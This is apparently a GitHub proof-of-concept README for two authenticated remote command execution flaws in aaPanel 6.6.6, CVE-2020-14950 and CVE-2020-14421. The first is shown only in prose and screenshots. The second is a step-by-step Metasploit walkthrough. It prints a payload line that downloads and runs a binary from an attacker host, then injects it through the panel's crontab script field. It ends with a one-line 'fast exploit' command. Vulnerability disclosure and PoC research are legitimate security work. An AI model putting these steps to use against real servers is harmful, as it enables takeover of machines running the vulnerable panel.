# aapanel

## aapanel 6.6.6 - CVE-2020-14950

* Description : allows remote authenticated users to execute arbitrary commands via the setting menu of Sotfware Store.
* Affected version : All <= 6.6.6

### Information

To make this PoC, I just installed the software using docker-compose

* Vulnerability Type : Remote command execution (Authenticated RCE)

### POC

Go to Software Store, click on any row from the setting's field, intercept the request when you click on "start/stop/restart" and modify/edit the resquest to execute what you want. Here is an example with curl : 

<img width="1280" alt="receStore" src="https://raw.githubusercontent.com/jenaye/aapanel/master/injectionCommandStore.png">

<img width="1280" alt="receStore" src="https://raw.githubusercontent.com/jenaye/aapanel/master/getCurl.png">

## aapanel 6.6.6 - CVE-2020-14421

* Description : Allows attacker to run arbitrary command remotely
* Affected version : All <= 6.6.6

### Information

To make this PoC, I just installed fresh Ubuntu 20.04, then I installed `wget` + `sudo` and executed this script `wget -O install.sh http://www.aapanel.com/script/install-ubuntu_6.0_en.sh && sudo bash install.sh` 

* Vulnerability Type : Remote command execution (RCE Authenticated)

### POC

First of all, setup web_delivery options, this will create a payload and a listener.

<img width="1280" alt="web_delivery" src="https://raw.githubusercontent.com/jenaye/aapanel/master/web_delivery.png">

Now run it 

<img width="1280" alt="run" src="https://raw.githubusercontent.com/jenaye/aapanel/master/run.png">

this will generate the following payload: 

`wget -qO wt8v00sC --no-check-certificate http://xxxx:8088/gUVn1orp; chmod +x wt8v00sC; ./wt8v00sC& disown`

Then  copy/past like this into `script content` of crontab menu in aapanel.

<img width="1280" alt="cron" src="https://raw.githubusercontent.com/jenaye/aapanel/master/cron.png">

Now just execute your crontab and wait your session.

<img width="1280" alt="command" src="https://raw.githubusercontent.com/jenaye/aapanel/master/command.png">

### Fast Exploit

Just run `msfconsole -r aapanel.rc`  copy/paste the payload into  script content section, and enjoy your session.
